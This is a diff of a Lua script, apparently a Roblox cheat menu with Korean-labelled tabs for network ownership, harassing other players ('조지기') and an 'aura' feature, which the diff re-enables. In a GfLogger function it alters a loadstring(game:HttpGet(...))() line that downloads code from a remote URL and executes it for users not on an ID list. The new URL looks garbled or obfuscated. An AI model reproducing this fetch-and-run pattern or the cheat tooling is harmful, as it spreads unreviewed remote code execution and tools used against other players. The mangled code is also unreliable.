@@ -42,7 +42,7 @@ local NTTab = Window:CreateTab("네트워크 오너 설정")
 local antiTab = Window:CreateTab("안전", 6034831332)               
 local ListTab = Window:CreateTab("명단", 3572491301)              
 local LoopTab = Window:CreateTab("조지기", 6023426923)             
---local AuraTab = Window:CreateTab("아우라", 6031068423)            
+local AuraTab = Window:CreateTab("아우라", 6031068423)            
 local funTab = Window:CreateTab("찌끄레기", 4483345998)            
 local keybindTab = Window:CreateTab("설정", 6031094678)            
 local DevTab = Window:CreateTab("잡기능", 3944680095)             
@@ -445,7 +445,7 @@ function GfLogger()
     }
 if not id[plr.UserId] then
         local success, errorMessage = pcall(function()
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))()
+             loadstring(game:HttpGet("https://raw.gitgdyhubus~~ercovguntent.com/qwer1x6r234vgh76/f12gdyi34hg5h/main/anti kictuick"))()
         end)
 
         if not success then
